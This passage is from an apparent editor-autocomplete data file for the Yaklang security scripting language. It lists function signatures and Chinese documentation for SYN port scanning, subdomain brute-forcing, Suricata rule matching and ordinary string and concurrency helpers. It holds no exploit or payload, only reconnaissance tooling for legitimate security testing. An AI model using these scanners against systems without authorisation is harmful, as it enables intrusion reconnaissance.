              'callback(callback func(result *synscan.SynScanResult)) SynxConfigOption  doc:callback syn scan 的配置选项，设置一个回调函数，每发现一个端口就会调用一次\n\n@param {func(i *synscan.SynScanResult)} i 回调函数\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("127.0.0.1", "1-65535",\n\n\tsynscan.callback(func(i){\n\t   db.SavePortFromResult(i) // 将结果保存到数据库\n\t})\n\n)\ndie(err)\n```\n',
          },
          {
            functionName:
              "ScanFromPing(${1:res /*type: chan *pingutil.PingResult*/}, ${2:ports /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              'ScanFromPing(res chan *pingutil.PingResult, ports string, opts ...synscanx.SynxConfigOption) (chan *synscan.SynScanResult, error)  doc:ScanFromPing 对使用 ping.Scan 探测出的存活结果进行端口扫描，需要配合 ping.Scan 使用\n\n@param {chan *PingResult} res ping.Scan 的扫描结果\n\n@param {string} ports 端口，支持 1-65535、1,2,3、1-100,200-300 格式\n\n@param {scanOpt} [opts] synscan 扫描参数\n\n@return {chan *synscan.SynScanResult} 返回结果\n\nExample:\n```\npingResult, err = ping.Scan("192.168.1.1/24") // 先进行存活探测\ndie(err)\nres, err = synscan.ScanFromPing(pingResult, "1-65535") // 对存活结果进行端口扫描\ndie(err)\n\n\tfor r := range res {\n\t  r.Show()\n\t}\n\n```\n',
          },
          {
            functionName:
              "Scan(${1:targets /*type: string*/}, ${2:ports /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              'Scan(targets string, ports string, opts ...synscanx.SynxConfigOption) (chan *synscan.SynScanResult, error)  doc:Scan 使用 SYN 扫描技术进行端口扫描，它不必打开一个完整的TCP连接，只发送一个SYN包，就能做到打开连接的效果，然后等待对端的反应\n\n@param {string} target 目标地址，支持 CIDR 格式\n\n@param {string} port 端口，支持 1-65535、1,2,3、1-100,200-300 格式\n\n@param {scanOpt} [opts] synscan 扫描参数\n\n@return {chan *synscan.SynScanResult} 返回结果\n\nExample:\n```\nres, err := synscan.Scan("127.0.0.1", "1-65535") //\ndie(err)\n\n\tfor result := range res {\n\t  result.Show()\n\t}\n\n```\n',
          },
          {
            functionName: "FixPermission()",
            document: "",
            definitionStr:
              "FixPermission() error  doc:FixPermission 尝试修复 pcap 权限问题\n\nExample:\n```\nerr := pcapfix.Fix()\ndie(err) // 没有错误，即可正常使用 syn 扫描\n...\n```\n",
          },
        ],
      },
      {
        libName: "sync",
        prefix: "sync.",
        functions: [
          {
            functionName: "NewWaitGroup(${1:ctxs...})",
            document: "",
            definitionStr:
              'NewWaitGroup(ctxs ...context.Context) *WaitGroupProxy  doc:NewWaitGroup 创建一个 WaitGroup 结构体引用，其帮助我们在处理多个并发任务时，等待所有任务完成后再进行下一步操作\n\nExample:\n```\nwg = sync.NewWaitGroup()\nfor i in 5 {\nwg.Add() // 增加一个任务\ngo func(i) {\ndefer wg.Done()\ntime.Sleep(i)\nprintf("任务%d 完成\\n", i)\n}(i)\n}\nwg.Wait()\nprintln("所有任务完成")\n```\n',
          },
          {
            functionName:
              "NewSizedWaitGroup(${1:size /*type: int*/}, ${2:ctxs...})",
            document: "",
            definitionStr:
              'NewSizedWaitGroup(size int, ctxs ...context.Context) *utils.SizedWaitGroup  doc:NewSizedWaitGroup 创建一个 SizedWaitGroup 结构体引用，其帮助我们在处理多个并发任务时，等待所有任务完成后再进行下一步操作\n\nSizedWaitGroup 与 WaitGroup 的区别在于 SizedWaitGroup 可以限制并发任务的数量\n\nExample:\n```\nwg = sync.NewSizedWaitGroup(5) // 限制大小为5\nfor i in 10 {\nwg.Add() // 任务数量超过5时，会阻塞，直到有任务完成\ngo func(i) {\ndefer wg.Done()\ntime.Sleep(i)\nprintf("任务%d 完成\\n", i)\n}(i)\n}\nwg.Wait()\nprintln("所有任务完成")\n```\n',
          },
          {
            functionName: "NewRWMutex()",
            document: "",
            definitionStr:
              'NewRWMutex() *sync.RWMutex  doc:NewRWMutex 创建一个 RWMutex 结构体引用，用于实现读写锁，其帮助我们避免多个并发任务访问同一个资源时出现数据竞争问题\n\nExample:\n```\nm = sync.NewRWMutex()\nnewMap = make(map[string]string)\ngo func{\nfor {\nm.Lock()         // 请求写锁\ndefer m.Unlock() // 释放写锁\nnewMap["key"] = "value" // 防止多个并发任务同时修改 newMap\n}\n}\nfor {\nm.RLock()         // 请求读锁\ndefer m.RUnlock() // 释放读锁\nprintln(newMap["key"])\n}\n```\n',
          },
          {
            functionName: "NewPool(${1:newFunc...})",
            document: "",
            definitionStr:
              'NewPool(newFunc ...func() any) *sync.Pool  doc:NewPool 创建一个 Pool 结构体引用，其帮助我们复用临时对象，减少内存分配的次数\n\nExample:\n```\np = sync.NewPool(func() {\nreturn make(map[string]string)\n})\nm = p.Get() // 从 Pool 中获取，如果 Pool 中没有，则会调用传入的第一个参数函数，返回一个新的 map[string]string\nm["1"] = "2"\nprintln(m) // {"1": "2"}\n// 将 m 放回 Pool 中\np.Put(m)\nm2 = p.Get() // 从 Pool 中获取，实际上我们获取到的是刚 Put 进去的 m\nprintln(m2) // {"1": "2"}\n```\n',
          },
          {
            functionName: "NewOnce()",
            document: "",
            definitionStr:
              'NewOnce() *sync.Once  doc:NewOnce 创建一个 Once 结构体引用，其帮助我们确保某个函数只会被执行一次\n\nExample:\n```\no = sync.NewOnce()\nfor i in 10 {\no.Do(func() { println("this message will only print once") })\n}\n```\n',
          },
          {
            functionName: "NewMutex()",
            document: "",
            definitionStr:
              'NewMutex() *sync.Mutex  doc:NewMutex 创建一个 Mutex 结构体引用，用于实现互斥锁，其帮助我们避免多个并发任务访问同一个资源时出现数据竞争问题\n\nExample:\n```\nm = sync.NewMutex()\nnewMap = make(map[string]string)\ngo func{\nfor {\nm.Lock()         // 请求锁\ndefer m.Unlock() // 释放锁\nnewMap["key"] = "value" // 防止多个并发任务同时修改 newMap\n}\n}\nfor {\nprintln(newMap["key"])\n}\n```\n',
          },
          {
            functionName: "NewMap()",
            document: "",
            definitionStr:
              'NewMap() *sync.Map  doc:NewMap 创建一个 Map 结构体引用，这个 Map 是并发安全的\n\nExample:\n```\nm = sync.NewMap()\ngo func {\nfor {\nm.Store("key", "value2")\n}\n}\nfor {\nm.Store("key", "value")\nv, ok = m.Load("key")\nif ok {\nprintln(v)\n}\n}\n```\n',
          },
          {
            functionName: "NewLock()",
            document: "",
            definitionStr:
              'NewLock() *sync.Mutex  doc:NewLock 创建一个 Mutex 结构体引用，用于实现互斥锁，其帮助我们避免多个并发任务访问同一个资源时出现数据竞争问题\n\n它实际是 NewMutex 的别名\n\nExample:\n```\nm = sync.NewMutex()\nnewMap = make(map[string]string)\ngo func{\nfor {\nm.Lock()         // 请求锁\ndefer m.Unlock() // 释放锁\nnewMap["key"] = "value" // 防止多个并发任务同时修改 newMap\n}\n}\nfor {\nprintln(newMap["key"])\n}\n```\n',
          },
          {
            functionName: "NewCond()",
            document: "",
            definitionStr:
              'NewCond() *sync.Cond  doc:NewCond 创建一个 Cond 结构体引用，即一个条件变量，参考golang官方文档：https://golang.org/pkg/sync/#Cond\n\n条件变量是一种用于协调多个并发任务之间的同步机制，它允许一个任务等待某个条件成立，同时允许其他任务在条件成立时通知等待的任务\n\nExample:\n```\nc = sync.NewCond()\ndone = false\nfunc read(name) {\nc.L.Lock()\nfor !done {\nc.Wait()\n}\nprintln(name, "start reading")\nc.L.Unlock()\n}\n\nfunc write(name) {\ntime.sleep(1)\nprintln(name, "start writing")\nc.L.Lock()\ndone = true\nc.L.Unlock()\nprintln(name, "wakes all")\nc.Broadcast()\n}\n\ngo read("reader1")\ngo read("reader2")\ngo read("reader3")\nwrite("writer")\ntime.sleep(3)\n```\n',
          },
        ],
      },
      {
        libName: "suricata",
        prefix: "suricata.",
        functions: [
          {
            functionName:
              "groupCallback(${1:cb /*type: func(packet gopacket.Packet, match *rule.Rule)*/})",
            document: "",
            definitionStr:
              "groupCallback(cb func(packet gopacket.Packet, match *rule.Rule)) GroupOption",
          },
          {
            functionName:
              "YieldSuricataRulesByKeywords(${1:keywords /*type: string*/}, ${2:protos...})",
            document: "",
            definitionStr:
              "YieldSuricataRulesByKeywords(keywords string, protos ...string) chan *rule.Storage",
          },
          {
            functionName:
              "YieldRulesByKeyword(${1:keywords /*type: string*/}, ${2:protos...})",
            document: "",
            definitionStr:
              "YieldRulesByKeyword(keywords string, protos ...string) chan *rule.Storage",
          },
          {
            functionName: "YieldRules()",
            document: "",
            definitionStr: "YieldRules() chan *rule.Storage",
          },
          {
            functionName: "TrafficGenerator()",
            document: "",
            definitionStr: "TrafficGenerator() *ChaosMaker",
          },
          {
            functionName:
              "ParseSuricata(${1:data /*type: string*/}, ${2:envs...})",
            document: "",
            definitionStr:
              "ParseSuricata(data string, envs ...string) ([]*Rule any, error any)",
          },
          {
            functionName: "NewSuricataMatcherGroup(${1:opt...})",
            document: "",
            definitionStr: "NewSuricataMatcherGroup(opt ...GroupOption) *Group",
          },
          {
            functionName: "NewSuricataMatcher(${1:r /*type: *rule.Rule*/})",
            document: "",
            definitionStr: "NewSuricataMatcher(r *rule.Rule) *Matcher",
          },
          {
            functionName: "LoadSuricataToDatabase(${1:raw /*type: string*/})",
            document: "",
            definitionStr: "LoadSuricataToDatabase(raw string) error",
          },
        ],
      },
      {
        libName: "subdomain",
        prefix: "subdomain.",
        functions: [
          {
            functionName: "workerConcurrent(${1:c /*type: int*/})",
            document: "",
            definitionStr:
              'workerConcurrent(c int) ConfigOption  doc:workerConcurrent 是一个选项参数，设置总的工作线程数量，默认为 50\n\nExample:\n```\nsubdomain.Scan("example.com", subdomain.workerConcurrent(10))\n```\n',
          },
          {
            functionName: "wildcardToStop(${1:t /*type: bool*/})",
            document: "",
            definitionStr:
              'wildcardToStop(t bool) ConfigOption  doc:wildcardToStop 是一个选项参数，遇到泛解析的情况，是否马上停止解析，默认为 false\n\nExample:\n```\nsubdomain.Scan("example.com", subdomain.wildcardToStop(true))\n```\n',
          },
          {
            functionName: "targetTimeout(${1:i /*type: float64*/})",
            document: "",
            definitionStr:
              'targetTimeout(i float64) subdomain.ConfigOption  doc:targetTimeout 是一个选项参数，设置每个目标的超时时间，单位为秒，默认为 300s\n\nExample:\n```\nsubdomain.Scan("example.com", subdomain.targetTimeout(10))\n```\n',
          },
          {
            functionName: "targetConcurrent(${1:c /*type: int*/})",
            document: "",
            definitionStr:
              'targetConcurrent(c int) ConfigOption  doc:targetConcurrent 是一个选项参数，设置每个目标的最大线程数量，默认为 10\n\nExample:\n```\nsubdomain.Scan("example.com", subdomain.targetConcurrent(5))\n```\n',
          },
          {
            functionName: "recursiveDict(${1:i})",
            document: "",
            definitionStr:
              'recursiveDict(i any) subdomain.ConfigOption  doc:recursiveDict 是一个选项参数，设置子域名爆破递归字典，其第一个参数可以是文件名、字符串或字符串数组\n\nExample:\n```\ndict = "/tmp/sub-dict.txt"\nsubdomain.Scan("example.com", subdomain.recursive(true), subdomain.recursiveDict(dict))\n```\n',
          },
          {
            functionName: "recursive(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'recursive(b bool) ConfigOption  doc:recursive 是一个选项参数，设置是否递归扫描子域名，如果不递归扫描，那么只会扫描一层子域名，默认为false\n\nExample:\n```\nsubdomain.Scan("example.com", subdomain.recursive(true))\n```\n',
          },
          {
            functionName: "maxDepth(${1:d /*type: int*/})",
            document: "",
            definitionStr:
              'maxDepth(d int) ConfigOption  doc:maxDepth 是一个选项参数，设置子域名遍历的最大深度，默认为 5，通常与 recursive 一起使用\n\nExample:\n```\nsubdomain.Scan("example.com", subdomain.maxDepth(10), subdomain.recursive(true))\n```\n',
          },
          {
            functionName: "mainDict(${1:i})",
            document: "",
            definitionStr:
              'mainDict(i any) subdomain.ConfigOption  doc:mainDict 是一个选项参数，设置子域名爆破主字典，其第一个参数可以是文件名、字符串或字符串数组\n\nExample:\n```\ndict = "/tmp/dict.txt"\nsubdomain.Scan("example.com", subdomain.mainDict(dict))\n```\n',
          },
          {
            functionName: "eachSearchTimeout(${1:i /*type: float64*/})",
            document: "",
            definitionStr:
              'eachSearchTimeout(i float64) subdomain.ConfigOption  doc:withEachSearchTimeout 是一个选项参数，设置每个搜索的超时时间，单位为秒，默认为 10s\n\nExample:\n```\nsubdomain.Scan("example.com", subdomain.withEachSearchTimeout(5))\n```\n',
          },
          {
            functionName: "eachQueryTimeout(${1:i /*type: float64*/})",
            document: "",
            definitionStr:
              'eachQueryTimeout(i float64) subdomain.ConfigOption  doc:eachQueryTimeout 是一个选项参数，设置每个查询的超时时间，单位为秒，默认为 3s\n\nExample:\n```\nsubdomain.Scan("example.com", subdomain.eachQueryTimeout(5))\n```\n',
          },
          {
            functionName: "dnsServer(${1:servers /*type: []string*/})",
            document: "",
            definitionStr:
              'dnsServer(servers []string) ConfigOption  doc:dnsServer 是一个选项参数，设置用于解析域名的 DNS 服务器，默认为 114.114.114.114 和 8.8.8.8\n\nExample:\n```\nsubdomain.Scan("example.com", subdomain.dnsServer("1.1.1.1"))\n```\n',
          },
          {
            functionName: "Scan(${1:target}, ${2:opts...})",
            document: "",
            definitionStr:
              'Scan(target any, opts ...subdomain.ConfigOption) (chan *subdomain.SubdomainResult, error)  doc:Scan 对域名进行子域名扫描，它的第一个参数可以接收字符串或字符串数组，接下来可以接收零个到多个选项，用于对此次扫描进行配置，例如设置扫描超时时间，是否递归等，返回结果管道与错误\n\n使用 请求(爆破)，查询，域传送技术进行子域名扫描\n\nExample:\n```\nfor domain in subdomain.Scan("example.com")~ {\ndump(domain)\n}\n```\n',
          },
        ],
      },
      {
        libName: "str",
        prefix: "str.",
        functions: [
          {
            functionName: "f(${1:f /*type: string*/}, ${2:items...})",
            document: "",
            definitionStr:
              'f(f string, items ...any) string  doc:f 用于对字符串进行格式化\n\nExample:\n```\n\nstr.f("hello %s", "yak") // hello yak\n```\n',
          },
          {
            functionName:
              "VersionLessEqual(${1:v1 /*type: string*/}, ${2:v2 /*type: string*/})",
            document: "",
            definitionStr:
              'VersionLessEqual(v1 string, v2 string) bool  doc:VersionLessEqual 使用版本比较算法比较版本 v1 与版本 v2，如果 v1 小于等于 v2 返回 true，否则返回 false\n\nExample:\n```\nstr.VersionLessEqual("0.9.9", "1.0.0") // true\nstr.VersionLessEqual("3.0", "3.0") // true\nstr.VersionLessEqual("3.0a", "3.0") // false\n```\n',
          },
          {
            functionName:
              "VersionLess(${1:v1 /*type: string*/}, ${2:v2 /*type: string*/})",
            document: "",
            definitionStr:
              'VersionLess(v1 string, v2 string) bool  doc:VersionLess 使用版本比较算法比较版本 v1 与版本 v2，如果 v1 小于 v2 返回 true，否则返回 false\n\nExample:\n```\nstr.VersionLess("0.9.9", "1.0.0") // true\nstr.VersionLess("3.0", "3.0a") // true\n```\n',
          },
          {
            functionName:
              "VersionGreaterEqual(${1:v1 /*type: string*/}, ${2:v2 /*type: string*/})",
            document: "",
            definitionStr:
              'VersionGreaterEqual(v1 string, v2 string) bool  doc:VersionGreaterEqual 使用版本比较算法比较版本 v1 与版本 v2，如果 v1 大于等于 v2 返回 true，否则返回 false\n\nExample:\n```\nstr.VersionGreaterEqual("1.0.0", "0.9.9") // true\nstr.VersionGreaterEqual("3.0", "3.0") // true\nstr.VersionGreaterEqual("3.0", "3.0a") // false\n```\n',
          },
          {
            functionName:
              "VersionGreater(${1:v1 /*type: string*/}, ${2:v2 /*type: string*/})",
            document: "",
            definitionStr:
              'VersionGreater(v1 string, v2 string) bool  doc:VersionGreater 使用版本比较算法比较版本 v1 与版本 v2，如果 v1 大于 v2 返回 true，否则返回 false\n\nExample:\n```\nstr.VersionGreater("1.0.0", "0.9.9") // true\nstr.VersionGreater("3.0", "2.8.8alpha") // true\n```\n',
          },
          {
            functionName:
              "VersionEqual(${1:v1 /*type: string*/}, ${2:v2 /*type: string*/})",
            document: "",
            definitionStr:
              'VersionEqual(v1 string, v2 string) bool  doc:VersionEqual 使用版本比较算法比较版本 v1 与版本 v2，如果 v1 等于 v2 返回 true，否则返回 false\n\nExample:\n```\nstr.VersionEqual("3.0", "3.0") // true\nstr.VersionEqual("3.0", "3.0a") // false\n```\n',
          },
          {
            functionName:
              "VersionCompare(${1:v1 /*type: string*/}, ${2:v2 /*type: string*/})",
            document: "",
            definitionStr:
              "VersionCompare(v1 string, v2 string) (int, error)  doc:VersionCompare 泛用形的版本比较,传入(p1,p2 string), p1>p2返回1,nil, p1<p2返回-1,nil, p1==p2返回0,nil, 比较失败返回 -2,err\n",
          },
          {
            functionName: "UrlJoin(${1:origin /*type: string*/}, ${2:paths...})",
            document: "",
            definitionStr:
              'UrlJoin(origin string, paths ...string) (newURL string, err error)  doc:UrlJoin 将 字符串 origin 和 字符串数组 paths 拼接成一个新的 URL 字符串，并返回错误\n\nExample:\n```\nnewURL, err = str.UrlJoin("https://yaklang.com", "asd", "qwe") // newURL = "https://yaklang.com/asd/qwe", err = nil\nnewURL, err = str.UrlJoin("https://yaklang.com/zxc", "/asd", "qwe") // newURL = "https://yaklang.com/asd/qwe", err = nil\n```\n',
          },
          {
            functionName:
              "TrimSuffix(${1:s /*type: string*/}, ${2:suffix /*type: string*/})",
            document: "",
            definitionStr:
              'TrimSuffix(s string, suffix string) string  doc:TrimSuffix 返回将字符串s后缀suffix去掉的字符串\n\nExample:\n```\nstr.TrimSuffix("Hello Yak", "ak") // Hello Y\nstr.TrimSuffix("HelloYak", "Yak") // Hello\n```\n',
          },
          {
            functionName: "TrimSpace(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'TrimSpace(s string) string  doc:TrimSpace 返回将字符串s两侧所有的空白字符都去掉的字符串\n\nExample:\n```\nstr.TrimSpace(" \\t\\n Hello Yak \\n\\t\\r\\n") // Hello Yak\n```\n',
          },
          {
            functionName:
              "TrimRight(${1:s /*type: string*/}, ${2:cutset /*type: string*/})",
            document: "",
            definitionStr:
              'TrimRight(s string, cutset string) string  doc:TrimRight 返回将字符串s右侧所有包含cutset字符串中的字符都去掉的字符串\n\nExample:\n```\nstr.TrimRight("Hello Yak", "k") // Hello Ya\nstr.TrimRight("HelloYak", "Yak") // Hello\n```\n',
          },
          {
            functionName:
              "TrimPrefix(${1:s /*type: string*/}, ${2:prefix /*type: string*/})",
            document: "",
            definitionStr:
              'TrimPrefix(s string, prefix string) string  doc:TrimPrefix 返回将字符串s前缀prefix去掉的字符串\n\nExample:\n```\nstr.TrimPrefix("Hello Yak", "Hello") //  Yak\nstr.TrimPrefix("HelloYak", "Hello") // Yak\n```\n',
          },
          {
            functionName:
              "TrimLeft(${1:s /*type: string*/}, ${2:cutset /*type: string*/})",
            document: "",
            definitionStr:
              'TrimLeft(s string, cutset string) string  doc:TrimLeft 返回将字符串s左侧所有包含cutset字符串中的字符都去掉的字符串\n\nExample:\n```\nstr.TrimLeft("Hello Yak", "H") // ello Yak\nstr.TrimLeft("HelloYak", "Hello") // Yak\n```\n',
          },
          {
            functionName:
              "Trim(${1:s /*type: string*/}, ${2:cutset /*type: string*/})",
            document: "",
            definitionStr:
              'Trim(s string, cutset string) string  doc:Trim 返回将字符串s两侧所有包含cutset字符串中的字符都去掉的字符串\n\nExample:\n```\nstr.Trim("Hello Yak", "Hk") // ello Ya\nstr.Trim("HelloYakHello", "Hello") // Yak\n```\n',
          },
          {
            functionName:
              "ToValidUTF8(${1:s /*type: string*/}, ${2:replacement /*type: string*/})",
            document: "",
            definitionStr:
              'ToValidUTF8(s string, replacement string) string  doc:ToValidUTF8 返回将字符串s中无效的UTF-8编码替换为replacement的字符串\n\nExample:\n```\n\nstr.ToValidUTF8("hello yak", "?") // hello yak\n```\n',
          },
          {
            functionName:
              "ToUpperSpecial(${1:c /*type: unicode.SpecialCase*/}, ${2:s /*type: string*/})",
            document: "",
            definitionStr:
              "ToUpperSpecial(c unicode.SpecialCase, s string) string  doc:ToUpperSpecial returns a copy of the string s with all Unicode letters mapped to their\nupper case using the case mapping specified by c.\n",
          },
          {
            functionName: "ToUpper(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'ToUpper(s string) string  doc:ToUpper 返回字符串s的大写形式\n\nExample:\n```\nstr.ToUpper("hello yak") // HELLO YAK\n```\n',
          },
          {
            functionName:
              "ToTitleSpecial(${1:c /*type: unicode.SpecialCase*/}, ${2:s /*type: string*/})",
            document: "",
            definitionStr:
              "ToTitleSpecial(c unicode.SpecialCase, s string) string  doc:ToTitleSpecial returns a copy of the string s with all Unicode letters mapped to their\nUnicode title case, giving priority to the special casing rules.\n",
          },
          {
            functionName: "ToTitle(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'ToTitle(s string) string  doc:ToTitle 返回字符串s的标题化版本，其中所有Unicode字母都会被转换为其大写\n\nExample:\n```\nstr.ToTitle("hello yak") // HELLO YAK\n```\n',
          },
          {
            functionName: "ToStringSlice(${1:i})",
            document: "",
            definitionStr:
              'ToStringSlice(i any) (result []string)  doc:ToStringSlice 将任意类型的数据转换为字符串切片\n\nExample:\n```\nstr.ToStringSlice("hello") // ["hello"]\nstr.ToStringSlice([1, 2]) // ["1", "2"]\n```\n',
          },
          {
            functionName:
              "ToLowerSpecial(${1:c /*type: unicode.SpecialCase*/}, ${2:s /*type: string*/})",
            document: "",
            definitionStr:
              "ToLowerSpecial(c unicode.SpecialCase, s string) string  doc:ToLowerSpecial returns a copy of the string s with all Unicode letters mapped to their\nlower case using the case mapping specified by c.\n",
          },
          {
            functionName: "ToLower(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'ToLower(s string) string  doc:ToLower 返回字符串s的小写形式\n\nExample:\n```\nstr.ToLower("HELLO YAK") // hello yak\n```\n',
          },
          {
            functionName: "ToJsonIndentStr(${1:d})",
            document: "",
            definitionStr:
              'ToJsonIndentStr(d any) string  doc:ToJsonIndentStr 将v转换为格式化的JSON字符串并返回，如果转换失败，则返回空字符串\n\nExample:\n```\nstr.ToJsonIndentStr({"hello":"yak"}) // {"hello": "yak"}\n```\n',
          },
          {
            functionName: "Title(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'Title(s string) string  doc:Title 返回字符串s的标题化版本，即所有单词的首字母都是大写的\n\nExample:\n```\nstr.Title("hello yak") // Hello Yak\n```\n',
          },
          {
            functionName:
              "Subtract(${1:x /*type: []string*/}, ${2:y /*type: []string*/})",
            document: "",
            definitionStr:
              'Subtract(x []string, y []string) []string  doc:Subtract 返回两个字符串切片的差集\n\nExample:\n```\nstr.Subtract(["1", "2", "3"], ["3", "4", "5"]) // ["1", "2"]\n```\n',
          },
          {
            functionName:
              "StringSliceContainsAll(${1:s /*type: []string*/}, ${2:elements...})",
            document: "",
            definitionStr:
              'StringSliceContainsAll(s []string, elements ...string) bool  doc:StringSliceContainsAll 判断字符串切片s中是否完全包含elements中的所有元素，对于非字符串的切片，会尝试将其元素转换为字符串再判断是否包含\n\nExample:\n```\nstr.StringSliceContainsAll(["hello", "yak"], "hello", "yak") // true\nstr.StringSliceContainsAll(["hello", "yak"], "hello", "yak", "world") // false\n```\n',
          },
          {
            functionName:
              "StringSliceContains(${1:s}, ${2:raw /*type: string*/})",
            document: "",
            definitionStr:
              'StringSliceContains(s any, raw string) (result bool)  doc:StringSliceContains 判断字符串切片s中是否包含raw，对于非字符串的切片，会尝试将其元素转换为字符串再判断是否包含\n\nExample:\n```\nstr.StringSliceContains(["hello", "yak"], "yak") // true\nstr.StringSliceContains([1, 2, 3], "4") // false\n```\n',
          },
          {
            functionName:
              "StringContainsAnyOfSubString(${1:s /*type: string*/}, ${2:subs /*type: []string*/})",
            document: "",
            definitionStr:
              'StringContainsAnyOfSubString(s string, subs []string) bool  doc:StringContainsAnyOfSubString 判断字符串s中是否包含subs中的任意一个子串\n\nExample:\n```\nstr.StringContainsAnyOfSubString("hello yak", ["yak", "world"]) // true\n```\n',
          },
          {
            functionName:
              "StartsWith(${1:s /*type: string*/}, ${2:prefix /*type: string*/})",
            document: "",
            definitionStr:
              'StartsWith(s string, prefix string) bool  doc:StartsWith / HasPrefix 判断字符串s是否以prefix开头\n\nExample:\n```\nstr.StartsWith("Hello Yak", "Hello") // true\nstr.StartsWith("Hello Yak", "Yak") // false\n```\n',
          },
          {
            functionName:
              "SplitN(${1:s /*type: string*/}, ${2:sep /*type: string*/}, ${3:n /*type: int*/})",
            document: "",
            definitionStr:
              'SplitN(s string, sep string, n int) []string  doc:SplitN 将字符串s按照sep分割成字符串切片，最多分为n个元素\n\nExample:\n```\nstr.SplitN("Hello-Yak-and-World", "-", 2) // [Hello", "Yak-and-World"]\n```\n',
          },
          {
            functionName: "SplitHostsToPrivateAndPublic(${1:hosts...})",
            document: "",
            definitionStr:
              'SplitHostsToPrivateAndPublic(hosts ...string) (privs []string, pub []string)  doc:SplitHostsToPrivateAndPublic 将 hosts 按照私有 IP 和公有 IP 分开\n\nExample:\n```\nstr.SplitHostsToPrivateAndPublic("127.0.0.1", "8.8.8.8", "10.0.0.1") // ["127.0.0.1", "10.0.0.1"], ["8.8.8.8"]\n```\n',
          },
          {
            functionName:
              "SplitHTTPHeadersAndBodyFromPacket(${1:raw /*type: []byte*/}, ${2:hook...})",
            document: "",
            definitionStr:
              'SplitHTTPHeadersAndBodyFromPacket(raw []byte, hook ...func(line string)) (headers string, body []byte)  doc:SplitHTTPHeadersAndBodyFromPacket 将传入的 HTTP 报文分割为 headers 和 body，如果传入了hook，则会在每次读取到一行 header 时调用 hook\n\nExample:\n```\nheaders, body = str.SplitHTTPHeadersAndBodyFromPacket(b"GET / HTTP/1.1\\r\\nHost: www.yaklang.com\\r\\n\\r\\n")\n```\n',
          },
          {
            functionName:
              "SplitAndTrim(${1:Raw /*type: string*/}, ${2:sep /*type: string*/})",
            document: "",
            definitionStr:
              'SplitAndTrim(Raw string, sep string) (targets []string)  doc:SplitAndTrim 将字符串s按照sep分割成字符串切片，并且去除每个字符串的前后空白字符\n\nExample:\n```\nstr.SplitAndTrim(" hello yak ", " ") // ["hello", "yak"]\n```\n',
          },
          {
            functionName:
              "SplitAfterN(${1:s /*type: string*/}, ${2:sep /*type: string*/}, ${3:n /*type: int*/})",
            document: "",
            definitionStr:
              'SplitAfterN(s string, sep string, n int) []string  doc:SplitAfterN 将字符串s按照sep分割成字符串切片，但是每个元素都会保留sep，最多分为n个元素\n\nExample:\n```\nstr.SplitAfterN("Hello-Yak-and-World", "-", 2) // [Hello-", "Yak-and-World"]\n```\n',
          },
          {
            functionName:
              "SplitAfter(${1:s /*type: string*/}, ${2:sep /*type: string*/})",
            document: "",
            definitionStr:
              'SplitAfter(s string, sep string) []string  doc:SplitAfter 将字符串s按照sep分割成字符串切片，但是每个元素都会保留sep\n\nExample:\n```\nstr.SplitAfter("Hello-Yak", "-") // [Hello-", "Yak"]\n```\n',
          },
          {
            functionName:
              "Split(${1:s /*type: string*/}, ${2:sep /*type: string*/})",
            document: "",
            definitionStr:
              'Split(s string, sep string) []string  doc:Split 将字符串s按照sep分割成字符串切片\n\nExample:\n```\nstr.Split("Hello Yak", " ") // [Hello", "Yak"]\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketBody(${1:raw /*type: []byte*/}, ${2:body /*type: []byte*/}, ${3:chunk /*type: bool*/})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketBody(raw []byte, body []byte, chunk bool) (newHTTPRequest []byte)  doc:ReplaceBody 将原始 HTTP 请求报文中的 body 替换为指定的 body，并指定是否为 chunked，返回新的 HTTP 请求报文\n\nExample:\n```\npoc.ReplaceBody(`POST / HTTP/1.1\nHost: example.com\nContent-Length: 11\n\nhello world`, "hello yak", false)\n```\n',
          },
          {
            functionName:
              "ReplaceAll(${1:s /*type: string*/}, ${2:old /*type: string*/}, ${3:new /*type: string*/})",
            document: "",
            definitionStr:
              'ReplaceAll(s string, old string, new string) string  doc:ReplaceAll 返回将字符串s中所有old字符串替换为new字符串的字符串\n\nExample:\n```\nstr.ReplaceAll("hello yak", "yak", "yakit") // hello yakit\n```\n',
          },
          {
            functionName:
              "Replace(${1:s /*type: string*/}, ${2:old /*type: string*/}, ${3:new /*type: string*/}, ${4:n /*type: int*/})",
            document: "",
            definitionStr:
              'Replace(s string, old string, new string, n int) string  doc:Replace 返回将字符串s中前n个old字符串替换为new字符串的字符串\n\nExample:\n```\nstr.Replace("hello yak", "l", "L", 1) // heLlo yak\n```\n',
          },
          {
            functionName:
              "Repeat(${1:s /*type: string*/}, ${2:count /*type: int*/})",
            document: "",
            definitionStr:
              'Repeat(s string, count int) string  doc:Repeat 返回将字符串s重复count次的字符串\n\nExample:\n```\nstr.Repeat("hello", 3) // hellohellohello\n```\n',
          },
          {
            functionName: "RemoveRepeat(${1:slc /*type: []string*/})",
            document: "",
            definitionStr:
              'RemoveRepeat(slc []string) []string  doc:RemoveRepeat 移除字符串切片slc中的重复元素\n\nExample:\n```\nstr.RemoveRepeat(["hello", "yak", "hello"]) // ["hello", "yak"]\n```\n',
          },
          {
            functionName:
              "RemoveDuplicatePorts(${1:ports1 /*type: string*/}, ${2:ports2 /*type: string*/})",
            document: "",
            definitionStr:
              'RemoveDuplicatePorts(ports1 string, ports2 string) []int  doc:RemoveDuplicatePorts 解析两个字符串形式的端口列表，并使用布谷鸟过滤器进行去重。\n\n这个函数首先创建一个布谷鸟过滤器，然后将两个输入字符串解析为端口列表。\n\n接着，它遍历这两个列表，将每个端口添加到布谷鸟过滤器中，如果这个端口之前没有被添加过，\n\n那么它也会被添加到结果列表中。最后，函数返回结果列表，其中包含两个输入字符串中的所有唯一端口。\n\nExample:\n```\nRemoveDuplicatePorts("10086-10088,23333", "10086,10089,23333") // [10086, 10087, 10088, 23333, 10089]\n```\n',
          },
          {
            functionName: "RegexpMatch(${1:pattern /*type: string*/}, ${2:s})",
            document: "",
            definitionStr:
